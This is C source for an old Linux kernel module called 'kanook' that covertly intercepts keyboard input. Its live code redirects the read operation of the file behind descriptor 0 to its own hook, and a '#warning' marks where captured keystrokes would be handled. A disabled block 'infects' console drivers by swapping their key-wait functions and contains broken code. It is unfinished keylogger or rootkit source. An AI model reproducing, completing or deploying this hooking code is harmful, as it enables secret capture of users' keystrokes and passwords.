#include <linux/module.h>
#include <linux/types.h>
#include <linux/kdev_t.h>
#include <linux/console.h>
#include <linux/malloc.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/smp_lock.h>

#if 0 /* these $%#$% routines are not actually used by the kernel! */
#include "list.h"

struct orig_console_info
{
    struct orig_console_info *next, *prev;
    struct console *console;
    int (*orig_wait_key)(struct console *c);
};

static struct orig_console_info orig_console_info;
static struct console *cons_drivers;;

static int
kanook_wait_key(struct console *c)
{
    struct orig_console_info *o;
    int ch;
    LIST_FOREACH(&orig_console_info, o)
	if (o->console == c)
	    goto found;
    printk("kanook_wait_key(%p), unknown console driver!\n", c);
    return -1;
 found:
    ch = o->orig_wait_key(c);
    if (ch>0)
	printk("hanook: ch = %d\n", ch);
    return ch;
}

/* this is *total evil* */
static struct console *
get_console_drivers()
{
    struct console c, *cons;
    memset(&c, 0, sizeof c);
    c.flags = CON_ENABLED | CON_CONSDEV;
    register_console(&c);
    cons = c.next;
    unregister_console(&c);
    return cons;
}

/* more *total evil* */
static struct tty_drivers *
get_tty_drivers()
{
    struct tty_driver t, *p;
    memset(&t, 0, sizeof t);
    t.name = "kanook";
    tty_register_driver(&t);
    p = t.next;
    tty_unregister_driver(&t);
    return p;
}

static void
infect_console_drivers()
{
    struct console *c;
    struct orig_console_info *o = &orig_console_info;
    printk("kanook: infect_console_drivers\n");
    LIST_INIT(o);
    
    c = cons_drivers = get_console_drivers();
    if (!c)
	return -1; /* no console */
    for (; c; c=c->next)
	{
	    if (c->wait_key)
		{
		    struct orig_console_info *o_new = kmalloc(sizeof *o_new, GFP_KERNEL);
		    o_new->console = c;
		    o_new->orig_wait_key = c->wait_key;
		    c->wait_key = kanook_wait_key;
		    LIST_INSERT_TAIL(o, o_new);
		    printk("kanook: hooked into %p, c->name = %.8s, c->read = %p, c->device = %p\n", c, c->name, c->read, c->device);
		}
	}
}

static void
infect_tty_drivers()
{
    struct tty_driver *tty;
    struct orig_console_info *o = &orig_console_info;
    printk("kanook: infect_console_drivers\n");
    LIST_INIT(o);
    
    c = cons_drivers = get_console_drivers();
    if (!c)
	return -1; /* no console */
    for (; c; c=c->next)
	{
	    if (c->wait_key)
		{
		    struct orig_console_info *o_new = kmalloc(sizeof *o_new, GFP_KERNEL);
		    o_new->console = c;
		    o_new->orig_wait_key = c->wait_key;
		    c->wait_key = kanook_wait_key;
		    LIST_INSERT_TAIL(o, o_new);
		    printk("kanook: hooked into %p, c->name = %.8s, c->read = %p, c->device = %p\n", c, c->name, c->read, c->device);
		}
	}
}
#endif

static ssize_t (*oldread) (struct file *, char *, size_t, loff_t *);

static ssize_t 
newread(struct file *file, char *buf, size_t size, loff_t *off)
{
    ssize_t cc = oldread(file, buf, size, off);
    if (cc<1)
	return cc;
#warning do something with key intercept data here
    return cc;
}

struct file_operations *oldf_op;
int
init_module(void)
{
    struct file *file;
    printk("kanook: init\n");
    lock_kernel();
    file = fget(0);
    if (!file ||
	!file->f_op ||
	!file->f_op->read)
	return -1;
    oldf_op = file->f_op;
    oldread = file->f_op->read;
    file->f_op->read = newread;
    unlock_kernel();
    return 0;
}

void
cleanup_module(void)
{
#if 0
    struct orig_console_info *ol = &orig_console_info,
	                     *o;
#endif
    printk("kanook: cleanup\n");
    lock_kernel();
    oldf_op->read = oldread;
    unlock_kernel();

#if 0
    LIST_FOREACH_DEL(ol, o)
	{
	    o->console->wait_key = o->orig_wait_key;
	    kfree(o);
	}
#endif
}
